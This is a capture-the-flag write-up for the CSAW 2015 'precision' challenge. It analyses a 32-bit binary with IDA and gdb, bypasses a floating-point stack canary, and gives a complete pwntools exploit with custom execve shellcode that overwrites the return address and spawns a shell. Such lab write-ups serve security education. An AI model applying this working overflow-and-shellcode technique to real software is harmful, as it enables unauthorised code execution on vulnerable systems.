The assembly writing portion of this writeup references this:
```
https://github.com/ctfs/write-ups-2015/tree/master/csaw-ctf-2015/pwn/precision-100
```

Let's take a look at the elf.

```
$	file precision_a8f6f0590c177948fe06c76a1831e650 
precision_a8f6f0590c177948fe06c76a1831e650: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=929fc6f283d6f6c3c039ee19bc846e927103ebcd, not stripped
$	checksec precision_a8f6f0590c177948fe06c76a1831e650 
[*] '/Hackery/ctf/15csaw/precision_a8f6f0590c177948fe06c76a1831e650'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
```

So we can see that we are dealing with a 32 bit elf, that has practically no binary hardening mitigations, Let's see what happens when we run the elf.

```
$	./precision_a8f6f0590c177948fe06c76a1831e650 
Buff: 0xffffcf68
I'm just a guy in a tuxedo.
Got I'm
$	./precision_a8f6f0590c177948fe06c76a1831e650 
Buff: 0xffffcf68
000000000000000000000000000000000000000000000000000000
Got 000000000000000000000000000000000000000000000000000000
$	python -c 'print "0"*500' | ./precision_a8f6f0590c177948fe06c76a1831e650 
Buff: 0xffffcf68
Nope
```

So when we run the elf, we are given an address which appears to be the start of our input. let's take a look at the code in IDA.

```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int input_buf; // [sp+18h] [bp-88h]@1
  double custom_canary; // [sp+98h] [bp-8h]@1

  custom_canary = 64.33333;
  setvbuf(stdout, 0, 2, 0);
  printf("Buff: %p\n", &input_buf);
  __isoc99_scanf("%s", &input_buf);
  if ( 64.33333 != custom_canary )
  {
    puts("Nope");
    exit(1);
  }
  return printf(str, &input_buf);
}
```

So after a bit of editing in IDA, this is the code for the main function. We can see that it starts out by establishing a char array, and a double. It then prints the address of the char array, and scans in data as a string to that buffer. However since it doesn't specify how much data that it will take in, so it is vulnerable to a buffer overflow. However there is the double `custom_canary` that will be inbetween the start of our input and the `eip` register. After the buffer overflow happens, it checks to see if it's value has changed, and if it has it prints "nope" and exits. So when we do our overflow, we have to ensure that we write over that double the same value that it has. Now let's move onto gdb to figure out how to do this:

```
gdb-peda$ disas main
Dump of assembler code for function main:
   0x0804851d <+0>:	push   ebp
   0x0804851e <+1>:	mov    ebp,esp
   0x08048520 <+3>:	and    esp,0xfffffff0
   0x08048523 <+6>:	sub    esp,0xa0
   0x08048529 <+12>:	fld    QWORD PTR ds:0x8048690
   0x0804852f <+18>:	fstp   QWORD PTR [esp+0x98]
   0x08048536 <+25>:	mov    eax,ds:0x804a040
   0x0804853b <+30>:	mov    DWORD PTR [esp+0xc],0x0
   0x08048543 <+38>:	mov    DWORD PTR [esp+0x8],0x2
   0x0804854b <+46>:	mov    DWORD PTR [esp+0x4],0x0
   0x08048553 <+54>:	mov    DWORD PTR [esp],eax
   0x08048556 <+57>:	call   0x8048400 <setvbuf@plt>
   0x0804855b <+62>:	lea    eax,[esp+0x18]
   0x0804855f <+66>:	mov    DWORD PTR [esp+0x4],eax
   0x08048563 <+70>:	mov    DWORD PTR [esp],0x8048678
   0x0804856a <+77>:	call   0x80483b0 <printf@plt>
   0x0804856f <+82>:	lea    eax,[esp+0x18]
   0x08048573 <+86>:	mov    DWORD PTR [esp+0x4],eax
   0x08048577 <+90>:	mov    DWORD PTR [esp],0x8048682
   0x0804857e <+97>:	call   0x8048410 <__isoc99_scanf@plt>
   0x08048583 <+102>:	fld    QWORD PTR [esp+0x98]
   0x0804858a <+109>:	fld    QWORD PTR ds:0x8048690
   0x08048590 <+115>:	fucomip st,st(1)
   0x08048592 <+117>:	fstp   st(0)
   0x08048594 <+119>:	jp     0x80485a9 <main+140>
   0x08048596 <+121>:	fld    QWORD PTR [esp+0x98]
   0x0804859d <+128>:	fld    QWORD PTR ds:0x8048690
   0x080485a3 <+134>:	fucomip st,st(1)
   0x080485a5 <+136>:	fstp   st(0)
   0x080485a7 <+138>:	je     0x80485c1 <main+164>
   0x080485a9 <+140>:	mov    DWORD PTR [esp],0x8048685
   0x080485b0 <+147>:	call   0x80483c0 <puts@plt>
   0x080485b5 <+152>:	mov    DWORD PTR [esp],0x1
   0x080485bc <+159>:	call   0x80483e0 <exit@plt>
   0x080485c1 <+164>:	mov    eax,ds:0x804a030
   0x080485c6 <+169>:	lea    edx,[esp+0x18]
   0x080485ca <+173>:	mov    DWORD PTR [esp+0x4],edx
   0x080485ce <+177>:	mov    DWORD PTR [esp],eax
   0x080485d1 <+180>:	call   0x80483b0 <printf@plt>
   0x080485d6 <+185>:	leave  
   0x080485d7 <+186>:	ret    
End of assembler dump.
gdb-peda$ b *main+102
Breakpoint 1 at 0x8048583
gdb-peda$ r
Starting program: /Hackery/ctf/15csaw/precision_a8f6f0590c177948fe06c76a1831e650 
Buff: 0xffffcf58
44866
```

It looks like a pointer to our input is at `esp+0x4`, and that the double is stored at `esp+0x98`:

```
Breakpoint 1, 0x08048583 in main ()
gdb-peda$ x/x $esp+0x4
0xffffcf44:	0xffffcf58
gdb-peda$ x/s 0xffffcf58
0xffffcf58:	"44866"
gdb-peda$ info frame
Stack level 0, frame at 0xffffcff0:
 eip = 0x8048583 in main; saved eip = 0xf7e13637
 called by frame at 0xffffd060
 Arglist at 0xffffcfe8, args: 
 Locals at 0xffffcfe8, Previous frame's sp is 0xffffcff0
 Saved registers:
  ebp at 0xffffcfe8, eip at 0xffffcfec
gdb-peda$ x/152x 0xffffcf58
0xffffcf58:	0x34	0x34	0x38	0x36	0x36	0x00	0xe8	0xf7
0xffffcf60:	0x8e	0xcf	0xff	0xff	0x8c	0xd0	0xff	0xff
0xffffcf68:	0xe0	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0xffffcf70:	0x00	0xd0	0xff	0xf7	0x18	0xd9	0xff	0xf7
0xffffcf78:	0x90	0xcf	0xff	0xff	0xb9	0x82	0x04	0x08
0xffffcf80:	0x00	0x00	0x00	0x00	0x24	0xd0	0xff	0xff
0xffffcf88:	0x00	0xd0	0xfa	0xf7	0xc7	0x1e	0x00	0x00
0xffffcf90:	0xff	0xff	0xff	0xff	0x2f	0x00	0x00	0x00
0xffffcf98:	0xc8	0x7d	0xe0	0xf7	0x58	0x58	0xfd	0xf7
0xffffcfa0:	0x00	0x80	0x00	0x00	0x00	0xd0	0xfa	0xf7
0xffffcfa8:	0x44	0xb2	0xfa	0xf7	0x85	0x83	0x04	0x08
0xffffcfb0:	0x01	0x00	0x00	0x00	0x07	0x00	0x00	0x00
0xffffcfb8:	0x00	0xa0	0x04	0x08	0x32	0x86	0x04	0x08
0xffffcfc0:	0x01	0x00	0x00	0x00	0x84	0xd0	0xff	0xff
0xffffcfc8:	0x8c	0xd0	0xff	0xff	0x0b	0x9c	0xe2	0xf7
0xffffcfd0:	0xdc	0xd3	0xfa	0xf7	0x20	0x82	0x04	0x08
0xffffcfd8:	0xa5	0x31	0x5a	0x47	0x55	0x15	0x50	0x40
0xffffcfe0:	0x00	0xd0	0xfa	0xf7	0x00	0xd0	0xfa	0xf7
0xffffcfe8:	0x00	0x00	0x00	0x00	0x37	0x36	0xe1	0xf7
gdb-peda$ x/38w 0xffffcf58
0xffffcf58:	0x36383434	0xf7e80036	0xffffcf8e	0xffffd08c
0xffffcf68:	0x000000e0	0x00000000	0xf7ffd000	0xf7ffd918
0xffffcf78:	0xffffcf90	0x080482b9	0x00000000	0xffffd024
0xffffcf88:	0xf7fad000	0x00001ec7	0xffffffff	0x0000002f
0xffffcf98:	0xf7e07dc8	0xf7fd5858	0x00008000	0xf7fad000
0xffffcfa8:	0xf7fab244	0x08048385	0x00000001	0x00000007
0xffffcfb8:	0x0804a000	0x08048632	0x00000001	0xffffd084
0xffffcfc8:	0xffffd08c	0xf7e29c0b	0xf7fad3dc	0x08048220
0xffffcfd8:	0x475a31a5	0x40501555	0xf7fad000	0xf7fad000
0xffffcfe8:	0x00000000	0xf7e13637
gdb-peda$ x/x $esp+0x98
0xffffcfd8:	0x475a31a5
gdb-peda$ x/2x $esp+0x98
0xffffcfd8:	0x475a31a5	0x40501555
```

and now to calculate the difference:
```
>>> 0xffffcfec - 0xffffcf58
148
>>> 0xffffcfd8 - 0xffffcf58
128
```

So we can see that there is 128 bytes worth of data before we hit the double, which by default is `0x475a31a540501555` (doubles in C are 8 bytes long). Then 12 bytes after that we reach the return address, which we can overwrite with the address that is the start of our input. That way we can push shellcode onto the buffer, then run it to get a shell. However there is one thing we need to keep in mind. The program uses `scanf` to scan in input, which will stop scanning in input at whitespace characters such as `0x0b` which many shellcodes out there use. To get around this, I just used the shellcode from `https://github.com/ctfs/write-ups-2015/blob/master/csaw-ctf-2015/pwn/precision-100/solve.py`. Instead of adding 0x0b (11) it adds 0x41 and subtracts 0x36 to get the same result without pushing 0x0b. Also the shellcode is 25 bytes long, so we will only need 103 bytes to reach the double.


exploit:
```
#import pwntools and start the process
from pwn import *
target = process("./precision_a8f6f0590c177948fe06c76a1831e650")

#Take in the first line of input, and filter out the address and print it
bof = target.recvline().strip("\n")
print bof
bof = bof.replace("Buff: ", "")
bof = int(bof, 16)
print "The start of our input is: " + hex(bof)

#Write the shellcode from https://github.com/ctfs/write-ups-2015/blob/master/csaw-ctf-2015/pwn/precision-100/solve.py
shellcode = asm(shellcraft.i386.pushstr('/bin///sh'))
shellcode += asm(shellcraft.i386.mov('ebx','esp'))
shellcode += asm(shellcraft.i386.mov('ecx',0))
#shellcode += asm(shellcraft.i386.push('0xb')) # Original, following instruction replace this command
shellcode += asm(shellcraft.i386.mov('eax',0x41)) # eax = 0x41
shellcode += '\x83\xe8\x36' # sub eax, 0x36 83 == sub, e8 == eax, 36 == number to subtract
shellcode += '\x99' # cdq
shellcode += '\xcd\x80' # int 0x8

#This isn't necissary, it just prints the length of the shellcode
print "The length of the shellcode is: " 
print len(shellcode)

#Assemble the payload
payload = shellcode + "0"*103 + "\xa5\x31\x5a\x47" + "\x55\x15\x50\x40" + "1"*12 + p32(bof)

#gdb.attach(target)

#Send the payload and drop to an interactive shell
target.sendline(payload) 
target.interactive()
```

using the exploit:
```
python exploit.py 
[+] Starting local process './precision_a8f6f0590c177948fe06c76a1831e650': pid 20651
Buff: 0xffffcf78
The start of our input is: 0xffffcf78
The length of the shellcode is: 
25
[*] Switching to interactive mode
Got jhh///sh/bin\x89�1�jAX\x83�6�̀0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\xa51ZGU\x15P@111111111111x��\xff
$ ls
ROPgadget.py  gpayload
Readme.md     payload
core          peda-session-precision_a8f6f0590c177948fe06c76a1831e650.txt
exploit.py    precision
flag.txt      precision_a8f6f0590c177948fe06c76a1831e650
$ cat flag.txt
flag{1_533_y0u_kn0w_y0ur_w4y_4r0und_4_buff3r}
```

Just like that, we pwned the binary.
